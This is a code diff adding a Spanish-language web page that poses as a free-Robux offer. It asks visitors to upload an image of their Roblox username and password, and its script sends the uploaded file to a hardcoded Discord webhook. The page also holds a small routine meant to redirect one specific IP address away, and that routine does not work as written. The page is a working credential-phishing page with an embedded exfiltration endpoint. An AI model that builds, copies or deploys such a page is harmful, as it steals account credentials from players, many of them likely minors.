@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Envía una imagen con el nombre y contraseña de tu cuenta de Roblox</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="file"] {
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .file-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #666;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .mode-buttons {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Envía una imagen con el nombre y contraseña de tu cuenta de Roblox</h1>
+        <label class="file-label" for="fileInput">Selecciona un archivo:</label>
+        <input type="file" id="fileInput">
+        <br>
+        <button onclick="enviarArchivo()">Enviar imagen para Robux gratis</button>
+        <div class="mode-buttons">
+            <button onclick="activarModoOscuro()">Modo oscuro</button>
+            <button onclick="activarModoClaro()">Modo claro</button>
+        </div>
+    </div>
+
+    <script>
+        // Función para bloquear la dirección IP
+        function bloquearIP() {
+            var blockedIP = '184.145.242.109'; // Dirección IP que deseas bloquear
+
+            // Función para redirigir si la IP está bloqueada
+            function checkBlockedIP() {
+                if (getIPAddress() === blockedIP) {
+                    window.location.href = 'https://www.google.com'; // Puedes redirigir a otra página
+                }
+            }
+
+            // Función para obtener la dirección IP del cliente
+            function getIPAddress() {
+                return new Promise((resolve, reject) => {
+                    fetch('https://api64.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip))
+                    .catch(error => reject(error));
+                });
+            }
+
+            // Verificar la dirección IP cuando la página se carga
+            window.onload = function() {
+                checkBlockedIP();
+            };
+        }
+
+        // Ejecutar la función para bloquear la IP
+        bloquearIP();
+
+        // Función para enviar el archivo a Discord
+        function enviarArchivo() {
+            var files = document.getElementById('fileInput').files;
+
+            if (files.length === 0) {
+                alert('Por favor, selecciona un archivo.');
+                return;
+            }
+
+            var fileName = files[0].name;
+
+            // Construir el mensaje para Discord
+            var message = "Archivo enviado a través de Replit:\n";
+            var formData = new FormData();
+            formData.append('file', files[0], fileName);
+
+            // Enviar el archivo a Discord a través de un formulario multipart
+            fetch('https://discord.com/api/webhooks/1234147589897846784/iqITsGWopro3M1TOWCc8l2QcAepnfIz6b1BjqyZYKce2xFVLOSGkUOraSKDpiDkoj9DR', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Hubo un error al enviar el archivo a Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error al enviar el archivo a Discord:', error);
+                alert('Hubo un error al enviar el archivo a Discord');
+            });
+        }
+
+        // Función para activar el modo oscuro
+        function activarModoOscuro() {
+            document.body.style.backgroundColor = '#222';
+            document.body.style.color = '#fff';
+        }
+
+        // Función para activar el modo claro
+        function activarModoClaro() {
+            document.body.style.backgroundColor = '#f2f2f2';
+            document.body.style.color = '#333';
+        }
+    </script>
+</body>
+</html>
